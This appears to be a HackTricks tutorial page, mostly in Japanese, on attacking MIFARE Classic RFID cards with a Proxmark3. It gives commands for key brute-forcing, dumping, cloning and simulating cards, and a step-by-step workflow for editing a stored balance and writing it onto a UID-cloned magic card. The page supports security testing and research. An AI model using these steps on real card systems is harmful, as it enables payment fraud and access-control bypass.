# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3によるRFIDシステムへの攻撃

最初に、[**Proxmark3**](https://proxmark.com)を用意し、[**softwareとその依存関係をインストール**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)する必要があります。

### MIFARE Classic 1KBへの攻撃

MIFARE Classic 1KBには**16セクター**があり、各セクターには**4ブロック**、各ブロックには**16B**が含まれています。UIDはセクター0のブロック0にあり、変更できません。\
各セクターにアクセスするには**2つのキー**（**A**と**B**）が必要で、これらは各セクターの**ブロック3**（セクタートレーラー）に保存されています。セクタートレーラーには、2つのキーを使用して**各ブロックの読み取りおよび書き込み**権限を設定する**アクセスビット**も保存されています。\
例えば、最初のキーを知っている場合は読み取り、2つ目のキーを知っている場合は書き込みの権限を付与するために、2つのキーが役立ちます。

複数の攻撃を実行できます<sup>[[1]](#references)</sup>。
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
The Proxmark3 を使用すると、**eavesdropping** によって **Tag to Reader communication** を傍受し、機密データを見つけ出すといった別の操作も実行できます。このカードでは、**cryptographic operations used are weak** であり、平文と暗号文がわかればキーを計算できるため（`mfkey64` tool）、通信を sniff して使用されたキーを計算できます。<sup>[[3]](#references)</sup>

#### MiFare Classic における stored-value abuse の簡易 workflow

端末が Classic カードに残高を保存する場合、一般的な end-to-end flow は次のとおりです。<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
メモ

- `hf mf autopwn` は nested/darkside/HardNested-style attacks を orchestrate し、keys を recover して、client dumps folder に dumps を作成します。
- block 0/UID の書き込みは magic gen1a/gen2 cards でのみ機能します。通常の Classic cards の UID は read-only です。<sup>[[2]](#references)</sup>
- 多くの deployment では Classic の "value blocks" または単純な checksums が使用されています。編集後は、重複フィールド、complemented fields、checksums がすべて整合していることを確認してください。

より高レベルな methodology と mitigations については、以下を参照してください。

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT systems では、**nonbranded または noncommercial tags** が使用されることがあります。この場合、Proxmark3 を使用して **tags に custom raw commands を送信**できます。
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
この情報を使えば、カードに関する情報や、カードとの通信方法を検索できます。Proxmark3 では、次のように raw commands を送信できます: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 software には、単純なタスクを実行するために使用できる **automation scripts** の preloaded list が付属しています。完全なリストを取得するには、`script list` command を使用します。次に、script の名前に続けて `script run` command を使用します:
```
proxmark3> script run mfkeys
```
**tag readers を fuzz**する script を作成できます。**valid card**のデータをコピーしたら、1つ以上のランダムな**bytes**を**randomize**する**Lua script**を書き、各 iteration で**reader が crash**するか確認するだけです。

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
